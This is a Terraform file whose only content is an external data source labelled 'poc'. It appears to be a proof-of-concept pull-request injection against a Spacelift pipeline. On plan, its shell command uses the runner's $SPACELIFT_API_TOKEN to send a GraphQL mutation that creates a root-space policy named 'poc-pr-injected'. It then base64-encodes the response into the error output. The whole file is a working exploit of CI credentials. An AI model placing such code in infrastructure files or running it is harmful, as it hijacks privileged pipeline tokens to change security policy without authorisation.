data "external" "poc" {
  program = ["sh", "-c", "R=$(curl -s -m 15 -H \"Authorization: Bearer $SPACELIFT_API_TOKEN\" -H 'Content-Type: application/json' -d '{\"query\":\"mutation{policyCreatev2(input:{name:\\\"poc-pr-injected\\\" body:\\\"package spacelift\\\" type:PLAN space:\\\"root\\\"}){id name}}\"}' \"$TF_VAR_spacelift_graphql_endpoint\"); echo \"MUTATION_RESULT: $R\" | base64 | tr -d '\\n' >&2; exit 1"]
}
